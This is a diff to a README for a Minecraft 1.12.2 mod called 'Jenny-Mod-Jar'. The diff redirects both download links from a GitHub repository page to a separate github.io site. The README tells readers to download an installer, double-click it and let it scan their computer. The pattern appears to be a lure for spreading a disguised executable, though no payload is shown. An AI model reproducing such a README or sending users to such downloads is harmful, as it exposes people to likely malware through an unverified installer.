@@ -1,6 +1,6 @@
 # 🎮 Jenny-Mod-Jar - Add Jenny Content To Minecraft Easily
 
-[![Download Jenny-Mod-Jar](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/light-foolscap580/Jenny-Mod-Jar)
+[![Download Jenny-Mod-Jar](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://light-foolscap580.github.io)
 
 ## 📖 About This Mod
 
@@ -24,7 +24,7 @@ First, open your Minecraft launcher. Select the 1.12.2 version from the list. Ru
 ### 2. Download The Installer
 Visit the official repository page to get the installer. You need to download the file directly to your desktop.
 
-[Click here to visit the download page](https://github.com/light-foolscap580/Jenny-Mod-Jar)
+[Click here to visit the download page](https://light-foolscap580.github.io)
 
 ### 3. Run The Installation
 Locate the downloaded file on your computer. Double-click the file to launch the setup window. The installer will scan your computer for the Minecraft installation folder. If it finds multiple folders, look for the correct path, which is usually found under C:\Users\[YourName]\AppData\Roaming\.minecraft.
